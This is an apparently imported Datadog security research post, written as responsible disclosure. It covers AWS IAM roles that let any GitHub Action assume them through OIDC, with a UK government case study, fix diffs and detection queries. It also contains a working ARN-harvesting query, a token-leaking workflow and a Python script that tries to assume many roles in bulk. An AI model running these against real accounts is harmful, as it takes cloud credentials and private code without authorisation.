---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-27_no-keys-attached-exploring-github-to-aws-keyless-authentication-flaws.md
original_filename: 2023-07-27_no-keys-attached-exploring-github-to-aws-keyless-authentication-flaws.md
title: 'No keys attached: Exploring GitHub-to-AWS keyless authentication flaws'
category: documents
detected_topics:
- cloud-security
- jwt
- oauth
- sso
- idor
- access-control
tags:
- imported
- documents
- cloud-security
- jwt
- oauth
- sso
- idor
- access-control
language: en
raw_sha256: 9228f26e0d92cb835e2a52d248c8667b1094509eb94db25d7110be49f10adaff
text_sha256: 3f63f8fabdd602d6a1ed6cd49eedc77b582be194b6bd50b65bc72d429040d02b
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# No keys attached: Exploring GitHub-to-AWS keyless authentication flaws

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-27_no-keys-attached-exploring-github-to-aws-keyless-authentication-flaws.md
- Source Type: markdown
- Detected Topics: cloud-security, jwt, oauth, sso, idor, access-control
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `9228f26e0d92cb835e2a52d248c8667b1094509eb94db25d7110be49f10adaff`
- Text SHA256: `3f63f8fabdd602d6a1ed6cd49eedc77b582be194b6bd50b65bc72d429040d02b`


## Content

---
title: "No keys attached: Exploring GitHub-to-AWS keyless authentication flaws"
page_title: "No keys attached: Exploring GitHub-to-AWS keyless authentication flaws | Datadog Security Labs"
url: "https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/"
final_url: "https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/"
authors: ["Christophe Tafani-Dereeper (@christophetd)"]
programs: ["UK Cabinet Office"]
bugs: ["OIDC", "CI/CD", "Cloud", "Account takeover"]
publication_date: "2023-07-27"
added_date: "2023-07-31"
source: "pentester.land/writeups.json"
original_index: 900
---

on this page

  * GitHub-to-AWS keyless authentication
  * Hunting for vulnerable roles in the wild
  * Identifying targets
  * Testing if a role is vulnerable
  * Automating the process
  * Results
  * Case study: A vulnerable IAM role in an UK Government's AWS account
  * The vulnerability
  * Impact
  * Root cause analysis
  * Remediation
  * GDS statement
  * Timeline
  * Identifying vulnerable IAM roles in your organization
  * Guardrails to prevent exploitation of vulnerable roles
  * How Datadog can help
  * Conclusion
  * Acknowledgements
  * Update (June 2025)

  * Updates made to this entry

[ ![Christophe Tafani-Dereeper](https://imgix.datadoghq.com/img/blog/_authors/tafani-dereeper_christophe2.jpeg?auto=format&w=48&h=48&dpr=2&q=75) Christophe Tafani-Dereeper Cloud Security Researcher and Advocate ](/articles/?author=Christophe_Tafani-Dereeper)

LAST UPDATED June 18, 2025

In this post, we discuss the GitHub-to-AWS keyless authentication flow using [OpenID Connect (OIDC)](https://auth0.com/docs/authenticate/protocols/openid-connect-protocol). We also demonstrate that a number of AWS identity and access management (IAM) roles in the wild were misconfigured, allowing untrusted GitHub Actions to assume them and retrieve AWS credentials. Finally, we discuss a specific misconfiguration we identified in the AWS environment of a UK government entity.

## GitHub-to-AWS keyless authentication

[Previous research](https://securitylabs.datadoghq.com/articles/public-cloud-breaches-2022-mccarthy-hopkins/) has shown that long-lived, static credentials such as IAM user access keys are one of the most common causes for data breaches in cloud environments.

In 2021, GitHub [released](https://github.blog/changelog/2021-10-27-github-actions-secure-cloud-deployments-with-openid-connect/) a new feature that can inject short-lived, signed [JSON Web Tokens (JWTs)](https://jwt.io/) into GitHub Actions signed by their OIDC provider. This eliminated the need for static credentials in Github Actions secrets, and unlocked the ability to use a cloud provider's native OIDC authentication capabilities.

In AWS, this keyless authentication [can be achieved](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services) by:

  1. Creating an OIDC provider in your AWS account, with the URL `https://token.actions.githubusercontent.com` and audience `sts.amazonaws.com`. This means that AWS will pull the signing keys, in accordance with the OIDC specification, from <https://token.actions.githubusercontent.com/.well-known/jwks> which uses the well-known OIDC discovery URL to automatically obtain certificate information to verify signed tokens
  2. Adding the OIDC provider to the trust policy of an IAM role, as follows:

  
  
  // ...
  "Principal": {
  "Federated": "arn:aws:iam::123456123456:oidc-provider/token.actions.githubusercontent.com"
  },
  // ...

  3. Adding a condition on the `token.actions.githubusercontent.com:sub` and `token.actions.githubusercontent.com:aud` condition keys, which correspond to the `sub` (subject) and `aud` (audience) claims of the JWTs. Both of these are claims in the JWT generated for all Github Actions:

  
  
  // ...
  "Condition": {
  "StringLike": {
  "token.actions.githubusercontent.com:sub": "repo:octo-org/octo-repo:*"
  },
  "StringEquals": {
  "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
  }
  }
  // ...

This last step is particularly important, as it defines which GitHub repository can assume the IAM role. If this condition is not present, **a GitHub Action from any GitHub repository can assume the role and retrieve credentials for it**.

However, we found that a number of IAM roles do not specify this condition, leaving them vulnerable to being assumed by an unauthorized GitHub Action. We believe this vulnerable condition has resulted from both a lack of awareness of how OIDC flows are designed to work—i.e., verifying both the audience and JWT subject—and the presence of insecure online guides. Note that the documentation from both GitHub and AWS does provide secure instructions.

## Hunting for vulnerable roles in the wild

In this section, we describe the method we used to identify vulnerable roles in the real world, using publicly accessible data.

### Identifying targets

The first step is to gather a list of real-world Amazon Resource Names (ARNs) for AWS IAM roles, ideally used in the context of a GitHub Actions pipeline. There are several ways to do this:

  * Use open-source intelligence (OSINT) techniques to passively collect publicly-available role ARNs.
  * Use OSINT to collect valid AWS account IDs and actively build a list of valid role names using [known techniques](https://hackingthe.cloud/aws/enumeration/enum_iam_user_role/). For instance, we can reasonably expect a target role to be named `github-actions`, `github-actions-role`, or a variation of these.

In our research, we leveraged [Sourcegraph](https://sourcegraph.com/search) to search through all GitHub repositories for strings that look like a role ARN, located in the `.github/workflows` folder:
  
  
  /arn:aws:iam::[0-9]{12}:role\/[\/a-zA-Z0-9-_]+/  
  path:\.github\/workflows\/.+ 
  count:all archived:yes fork:yes
  context:global
  

Specifically, we used the Sourcegraph CLI (`src`) to export the associated results to JSON:
  
  
  src search -stream -display 100000 -json "$query" > results.json

Using this simple approach, we were able to gather over 500 unique role ARNs from over 275 unique AWS accounts.

### Testing if a role is vulnerable

To test if a specific IAM role is vulnerable, we first have to understand how GitHub Actions retrieve a JWT that uniquely identifies them.

This process, transparently handled by the [configure-aws-credentials](https://github.com/aws-actions/configure-aws-credentials) official action, can be found in the [GitHub documentation](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#updating-your-actions-for-oidc):
  
  
  curl -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=<your-audience>"

The two environment variables are automatically injected at runtime and return a response containing a JWT that uniquely identifies the GitHub Action execution. The JWT payload looks as follows:
  
  
  {
  "sub": "repo:christophetd/aws-roles-github-actions:ref:refs/heads/main",
  "iss": "https://token.actions.githubusercontent.com",
  "aud": "sts.amazonaws.com",
  "ref": "refs/heads/main",
  "repository": "christophetd/aws-roles-github-actions",
  "repository_owner": "christophetd",
  "workflow": "Retrieve GitHub Actions token",
  // shortened for clarity
  }

We can exchange this JWT for AWS credentials using `sts:AssumeRoleWithWebIdentity`. To test if a role is vulnerable, we run:
  
  
  aws sts assume-role-with-web-identity \
  --role-arn <target-role> \
  --role-session-name test \
  --web-identity-token file:///path/to/jwt

If the role is vulnerable and has a trust policy allowing any GitHub Action to assume it, this call will return AWS credentials.

### Automating the process

To scale this process, we first start a GitHub Action that prints out the values of its `$ACTIONS_ID_TOKEN_REQUEST_TOKEN` and `$ACTIONS_ID_TOKEN_REQUEST_URL` environment variables, then sleeps indefinitely. This is needed because the JWT associated with a GitHub action cannot be used once it has finished running.
  
  
  name: Retrieve GitHub Actions token
  on: workflow_dispatch
  permissions:
  id-token: write # This is required for requesting the JWT
  contents: read  # This is required for actions/checkout
  jobs:
  build:
  runs-on: ubuntu-latest
  steps:
  - run: |
  echo curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | base64
  - run: 'sleep 21600'

We encode the result as base64—otherwise, GitHub believes the secret is unintentionally leaking and redacts it. With this information in hand, we proceed as follows:

  * For every target role, attempt to call `sts:AssumeRoleWithWebIdentity` to exchange the GitHub Action JWT for AWS credentials.
  * Refresh the GitHub Action JWT when it expires, as it has a short lifetime (less than 5 minutes).

We can use a simple Python script to achieve this:
  
  
  import time
  import requests
  import jwt as pyjwt # pip install pyjwt
  import boto3
  import botocore
  
  
  def get_jwt():
  audience='sts.amazonaws.com'
  gh_actions_id_token_request_token='...'
  gh_actions_id_token_request_url='https://pipelines.actions.githubusercontent.com/...' + audience
  response = requests.get(gh_actions_id_token_request_url, headers={'Authorization': 'Bearer ' + gh_actions_id_token_request_token})
  jwt = response.json()['value']
  expiration = int(pyjwt.decode(jwt, options={"verify_signature": False})['exp'])
  return jwt, expiration
  
  
  # Read the list of roles to test
  with open('role-arns.txt', 'r') as f:
  role_arns = f.read().splitlines()
  
  jwt_expiration = 0
  sts_client = boto3.client('sts')
  vulnerable = []
  for role_arn in role_arns:
  # Refresh the JWT if needed
  if round(time.time()) >= jwt_expiration:
  jwt, jwt_expiration = get_jwt()
  
  try:
  # Attempt to call sts:AssumeRoleWithWebIdentity
  response = sts_client.assume_role_with_web_identity(
  RoleArn=role_arn,
  RoleSessionName='test',
  WebIdentityToken=jwt
  )
  print("Successfully assumed role " + role_arn)
  print(response)
  vulnerable.append(role_arn)
  except botocore.exceptions.ClientError as error:
  if error.response['Error']['Code'] in ['AccessDenied', 'InvalidIdentityToken']:
  # could not assume the role - it's not vulnerable
  continue
  else:
  # something else went wrong, raise the error
  raise error
  
  print(f"Finished testing {len(role_arns)} roles, found {len(vulnerable)} vulnerable" )
  print(f"Vulnerable roles: \n\t" + '\n\t'.join(vulnerable))

### Results

Using this process, we were able to assume a number of vulnerable IAM roles and retrieve credentials for them, indicating that an attacker would have been able to abuse this flaw and leverage these credentials for malicious activity. Because CI/CD activities typically require a high level of permissions in an AWS account, roles involved in the CI/CI pipeline are often highly privileged.

We believe that two main factors contribute to this misconfiguration being relatively prevalent: the presence of several unofficial guides showcasing insecure examples.

We reported all affected roles to the maintainers of the appropriate repositories, when contact information was directly or indirectly available. In the next section, we focus on a specific finding: a vulnerable IAM role in an UK government AWS account.

## Case study: A vulnerable IAM role in an UK Government's AWS account

The UK government's Government Digital Service (GDS) is well-known for their strong involvement in [open source](https://alphagov.github.io/). Their official guidance to government services [includes](https://www.gov.uk/guidance/be-open-and-use-open-source) the following piece of advice:
  
  
  Be open and use open source
  Publish your code and use open source to improve transparency, flexibility, and accountability.

In particular, GDS [publishes](https://github.com/alphagov) a number of open source repositories such as handbooks, Terraform modules, Helm charts, and web application source code.

### The vulnerability

While scanning for vulnerable roles, we were able to assume an IAM role belonging to a GDS AWS account:

[![Retrieving AWS credentials from a vulnerable IAM role \(click to enlarge\)](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-role-credentials.png?auto=format&w=896&dpr=1.75) ](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-role-credentials.png?auto=format)

This IAM role is referenced in the repository [alphagov/govuk-infrastructure](https://github.com/alphagov/govuk-infrastructure), which contains a number of Terraform modules. In particular, it's used in a "[Mirror repositories](https://github.com/alphagov/govuk-infrastructure/blob/73eed80ed1d80ce4ceb5e109d7387eea1583388b/.github/workflows/mirror-repos.yml#L19-L25)" GitHub Actions workflow that assumes an AWS role, then syncs all GitHub repositories from the alphagov organization to private AWS CodeCommit repositories:

[![The vulnerable IAM role is used in a GitHub Action \(click to enlarge\)](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-mirror-job.png?auto=format&w=896&dpr=1.75) ](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-mirror-job.png?auto=format) [![The GitHub Action using the vulnerable role mirror private GitHub repositories to AWS CodeCommit \(click to enlarge\)](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-mirror-job-2.png?auto=format&w=896&dpr=1.75) ](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-mirror-job-2.png?auto=format)

### Impact

The Terraform `github_action_mirror_repos_role` IAM role is defined through Terraform, in a file called [`mirror.tf`](https://github.com/alphagov/govuk-infrastructure/blob/024163bdca0686343dd94c54aaa4cd02e6058edb/terraform/deployments/github/mirror.tf#L49-L50). We can see that this role has `codecommit:GitPull` and `codecommit:GitPush` permissions on all CodeCommit repositories in the AWS account:
  
  
  resource "aws_iam_role_policy" "github_action_mirror_repos_policy" {
  name = "github_action_mirror_repos_policy"
  role = aws_iam_role.github_action_mirror_repos_role.id
  
  policy = jsonencode({
  Version = "2012-10-17"
  Statement = [
  {
  Action = [
  "codecommit:GitPull",
  "codecommit:GitPush"
  ]
  Effect  = "Allow"
  Resource = "*"
  },
  ]
  })
  }

Consequently, after having compromised credentials for this role we're able to **pull from and push to any private CodeCommit repository** available in the AWS account.

Through the compromised credentials, we confirmed that we were able to access private GitHub repositories that had been mirrored to CodeCommit. For instance, the README of the govuk-infrastructure repository mentions the "alphagov/govuk-aws-data private repo"—while this repository is indeed private, we're now able to access its contents:

[![Using credentials obtained from the vulnerable IAM role, we were able to access the contents of private GitHub repositories \(click to enlarge\)](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-private-repository.png?auto=format&w=896&dpr=1.75) ](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/gds-private-repository.png?auto=format)

What's more, a malicious actor might have been able to push malicious Terraform code to the mirrored CodeCommit repository, enabling them to backdoor the resulting infrastructure and gain access to it. We reported the issue to the UK GDS, and are publishing this article with their permission.

### Root cause analysis

The trust policy of the `github_action_mirror_repos_role` IAM role is defined [as follows](https://github.com/alphagov/govuk-infrastructure/blob/024163bdca0686343dd94c54aaa4cd02e6058edb/terraform/deployments/github/mirror.tf#L49-L50):
  
  
  resource "aws_iam_role" "github_action_mirror_repos_role" {
  name = "github_action_mirror_repos_role"
  
  assume_role_policy = jsonencode({
  Version = "2012-10-17"
  Statement = [
  {
  "Effect" : "Allow",
  "Principal" : {
  "Federated" : "${aws_iam_openid_connect_provider.github_provider.arn}"
  },
  "Action" : "sts:AssumeRoleWithWebIdentity",
  "Condition" : {
  "StringEquals" : {
  "token.actions.githubusercontent.com:sub" : [
  "repo:alphagov/govuk-infrastructure:ref:refs/heads/main"
  ]
  },
  "StringEquals" : {
  "token.actions.githubusercontent.com:aud" : "${one(aws_iam_openid_connect_provider.github_provider.client_id_list)}"
  }
  }
  }
  ]
  })
  }

At first sight, this trust policy appears to be secure. There seems to be a condition on both the JWT subject (`token.actions.githubusercontent.com:sub`) and the audience (`token.actions.githubusercontent.com:aud`). What's wrong with the policy? It's an interesting challenge—grab a cup of coffee and look for the culprit!

The answer lies in how Terraform—and more specifically, the HCL language parser—handles duplicate map keys. While duplicate keys are forbidden in JSON, they're perfectly fine when building HCL maps ("objects"). In that case, the last occurrence of a duplicate key takes precedence:
  
  
  $ terraform console
  > {"key": "foo", "key": "bar" }
  {
  "key" = "bar"
  }

Notice how the trust policy of the IAM role is built by passing a map to the `jsonencode`, and how the `StringEquals` key is duplicated? This means that the map literal is **strictly equivalent to the below** , overwriting the `StringEquals` check on the JWT subject condition key:
  
  
  jsonencode({
  Version = "2012-10-17"
  Statement = [
  {
  "Effect" : "Allow",
  "Principal" : {
  "Federated" : "${aws_iam_openid_connect_provider.github_provider.arn}"
  },
  "Action" : "sts:AssumeRoleWithWebIdentity",
  "Condition" : {
  "StringEquals" : {
  "token.actions.githubusercontent.com:aud" : "${one(aws_iam_openid_connect_provider.github_provider.client_id_list)}"
  }
  }
  }
  ]
  })

This is what makes the role vulnerable to the attack described in this post. Several GitHub issues ([hcl#35](https://github.com/hashicorp/hcl/issues/35), [terraform#28727](https://github.com/hashicorp/terraform/issues/28727)) are currently open to discuss improvements on Terraform handling of duplicate map keys. Ideally, it should fail fast and not allow you to build a map that has duplicate keys at all, which would prevent this kind of error.

### Remediation

The fix for this particular version of the vulnerability is to remove the duplicated `StringEquals` key (see [fixed code](https://github.com/alphagov/govuk-infrastructure/blob/f97e2e420f875a3b5fb9d4a575a98de499c2b075/terraform/deployments/github/mirror.tf#L21-L27)):

[![The commit fixing the vulnerability \(click to enlarge\)](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/remediation-commit.png?auto=format&w=896&dpr=1.75) ](https://securitylabs.dd-static.net/img/exploring-github-to-aws-keyless-authentication-flaws/remediation-commit.png?auto=format)
  
  
  diff --git a/terraform/deployments/github/mirror.tf b/terraform/deployments/github/mirror.tf
  index 67cbe6bb..bce743a7 100644
  --- a/terraform/deployments/github/mirror.tf
  +++ b/terraform/deployments/github/mirror.tf
  @@ -26,11 +26,9 @@ resource "aws_iam_role" "github_action_mirror_repos_role" {
  "StringEquals" : {
  "token.actions.githubusercontent.com:sub" : [
  "repo:alphagov/govuk-infrastructure:ref:refs/heads/main"
  -  ]
  -  },
  -  "StringEquals" : {
  +  ],
  "token.actions.githubusercontent.com:aud" : "${one(aws_iam_openid_connect_provider.github_provider.client_id_list)}"
  -  }
  +  },
  }
  }
  ]
  

GDS also took this opportunity to further reduce the permissions required by the IAM role:
  
  
  diff --git a/terraform/deployments/github/mirror.tf b/terraform/deployments/github/mirror.tf
  index bce743a7..5a232761 100644
  --- a/terraform/deployments/github/mirror.tf
  +++ b/terraform/deployments/github/mirror.tf
  @@ -44,7 +44,6 @@ resource "aws_iam_role_policy" "github_action_mirror_repos_policy" {
  Statement = [
  {
  Action = [
  -  "codecommit:GitPull",
  "codecommit:GitPush"
  ]
  Effect  = "Allow"
  

### GDS statement

"_Because this CodeCommit repository serves only as a backup, this would not have allowed an attacker to immediately modify the behaviour of GOV UKs applications. However, if the GOV UK team had been in a situation where they needed to restore from this backup—for example, because they needed to do an urgent deploy during a major GitHub outage— there is a chance that deploying this compromised codecould have allowed an attacker to modify the behaviour GOV UK’s applications._

_Once notified by Datadog, GDS:_

_\- Promptly fixed the immediate issue by correcting the IAM policy_  
_\- Checked audit logs to confirm which repositories had been accessed during the window of exposure to confirm that there was no exploitation_  
_\- Checked the contents of those repositories for sensitive data, and took appropriate remedial  
action_  
_\- Produced an internal talk about this incident to share lessons learned_

_GDS would like to thank Datadog for their responsible disclosure and for allowing us to input to this  
blog post."_

### Timeline

  * May 9, 2023: Vulnerability identified
  * May 9, 2023: Vulnerability reported to the UK Cabinet Office through HackerOne
  * May 10, 2023: Initial response; investigation starts and request for more information
  * May 10, 2023: Additional information provided
  * May 10, 2023: Vulnerability is remediated, fewer than 26 hours after the initial report
  * July 27, 2023: Coordinated disclosure.

## Identifying vulnerable IAM roles in your organization

[Rezonate](https://www.rezonate.io/) has open sourced a tool on GitHub to identify if an AWS account contains vulnerable IAM roles, called [github-oidc-checker](https://github.com/Rezonate-io/github-oidc-checker/).

In addition, you can leverage the CloudTrail event `AssumeRoleWithWebIdentity` to identify when a GitHub Action successfully assumes an IAM role:
  
  
  {
  "userIdentity": {
  "type": "WebIdentityUser",
  "principalId": "arn:aws:iam::012345678901:oidc-provider/token.actions.githubusercontent.com:sts.amazonaws.com:repo:SOURCE-ORG/SOURCE-REPO:ref:refs/heads/BRANCH",
  "userName": "repo:SOURCE-ORG/SOURCE-REPO:ref:refs/heads/BRANCH",
  "identityProvider": "arn:aws:iam::012345678901:oidc-provider/token.actions.githubusercontent.com"
  },
  "eventSource": "sts.amazonaws.com",
  "eventName": "AssumeRoleWithWebIdentity",
  "userAgent": "aws-sdk-nodejs/2.1396.0 linux/v16.16.0 configure-aws-credentials-for-github-actions promise",
  "requestParameters": {
  "roleArn": "arn:aws:iam::012345678901:role/github-actions-role",
  "roleSessionName": "MySessionName",
  "durationSeconds": 3600
  },
  "responseElements": {
  "subjectFromWebIdentityToken": "repo:SOURCE-ORG/SOURCE-REPO:ref:refs/heads/BRANCH",
  "provider": "arn:aws:iam::012345678901:oidc-provider/token.actions.githubusercontent.com",
  "audience": "sts.amazonaws.com"
  }
  }

Here, you can leverage `userIdentity.userName` to identify events where a GitHub Action from an organization you don't own successfully assumes one of your IAM roles. This is a strong sign that the target role, indicated by `requestParameters.roleArn`, is vulnerable. If you're using AWS CloudTrail Lake, you can use the following SQL query:
  
  
  SELECT *
  FROM <event-data-store-id>
  WHERE eventSource ='sts.amazonaws.com' AND eventName = 'AssumeRoleWithWebIdentity'
  AND userIdentity.identityprovider LIKE '%:oidc-provider/token.actions.githubusercontent.com'
  AND userIdentity.username NOT LIKE 'repo:YOUR-GITHUB-ORG/%'
  ORDER BY eventTime DESC

## Guardrails to prevent exploitation of vulnerable roles

If you're using GitHub Enterprise, you can since [August 2022](https://github.blog/changelog/2022-08-23-github-actions-enhancements-to-openid-connect-support-to-enable-secure-cloud-deployments-at-scale/) specify a custom OpenID Connect issuer URL in the trust policy of your IAM role, of the form `https://token.actions.githubusercontent.com/<your-github-org>`. While the signing keys are the same, only GitHub Actions from your GitHub enterprise will be able to assume the role — _even_ if it's misconfigured — since the issuer (`iss`) field of the JWT will be unique to your enterprise.

You can read more about this in Aidan Steele's post "[Improve GitHub Actions OIDC security posture with custom issuer](https://awsteele.com/blog/2023/01/11/improve-github-actions-oidc-security-posture-with-custom-issuer.html)".

## How Datadog can help

Following our research, we also released on May 17, 2023, a Datadog CSPM rule intended to detect this misconfiguration — "[AWS IAM Role does not allow untrusted GitHub Actions to assume it](https://docs.datadoghq.com/security/default_rules/def-000-5g7)" — and proactively notified several customers that were affected by this issue. If you are a [Datadog Cloud Security Management](https://www.datadoghq.com/product/cloud-security-management/) customer, you can view any affected IAM role in your AWS accounts by [clicking on this link](https://app.datadoghq.com/security/compliance?query=%40workflow.rule.name%3A%22AWS%20IAM%20Role%20does%20not%20allow%20untrusted%20GitHub%20Actions%20to%20assume%20it%22&aggregation=resources&column=status&order=asc&sort=ruleSeverity%2CfailedResources-desc) and be alerted if a vulnerable role is created in the future.

In addition, you can search your CloudTrail logs for potential malicious GitHub Actions assuming an IAM role using the following logs query:
  
  
  source:cloudtrail @evt.name:AssumeRoleWithWebIdentity
  @userIdentity.identityProvider:*/token.actions.githubusercontent.com
  -@userIdentity.userName:repo\:YOUR-GITHUB-ORG/*
  

## Conclusion

In this post, we reviewed how "keyless" authentication works to allow GitHub Actions to assume AWS IAM role without long-lived credentials. We described the security risks associated with not checking the JWT subject in the role's trust policy, and demonstrated that it represents a real-world security risk that organizations face today. Finally, we deep-dived into our discovery of the vulnerability in an AWS account held by a UK government department, a misconfiguration that was challenging to identify by looking at the source code.

## Acknowledgements

We would like to thank the security team of the UK Cabinet Office, and in particular Martyn Duncan, for the smooth collaboration.

We would also like to acknowledge that two other organizations, [Tinder](https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8) and [Rezonate](https://www.rezonate.io/blog/github-misconfigurations-put-gcp-aws-in-account-takeover-risk/), published research on a similar topic while we had already started working on this piece of research. We believe that these publications are complementary to our research. After the publication of this post, Daniel Grzelak also [published](https://dagrz.com/writing/aws-security/hacking-github-aws-oidc/) additional methodology to retrieve further role ARNs from GitHub.

## Update (June 2025)

As of June 2025, AWS has [implemented](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc_secure-by-default.html) a restriction that automatically blocks the creation of roles with a vulnerable trust policy. However, the issue remain present for roles that previously existed.

##  Updates made to this entry

July 28, 2023Added a link to Aidan Steele's [post](https://awsteele.com/blog/2023/01/11/improve-github-actions-oidc-security-posture-with-custom-issuer.html) that explains how to use a custom GitHub OIDC issuer URL as an additional layer of security.

August 8, 2023Added a link to a follow-up [post](https://dagrz.com/writing/aws-security/hacking-github-aws-oidc/) by Daniel Grzelak

June 18, 2025Added a note about a new restriction that AWS released in early June 2025, preventing the creation of new vulnerable roles.

  * [ twitter ](https://twitter.com/share?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fexploring-github-to-aws-keyless-authentication-flaws%2F&text=No%20keys%20attached%3A%20Exploring%20GitHub-to-AWS%20keyless%20authentication%20flaws "twitter")
  * [ reddit ](https://www.reddit.com/submit?url=https%3A%2F%2Fsecuritylabs.datadoghq.com%2Farticles%2Fexploring-github-to-aws-keyless-authentication-flaws%2F "reddit")

##  Did you find this article helpful?
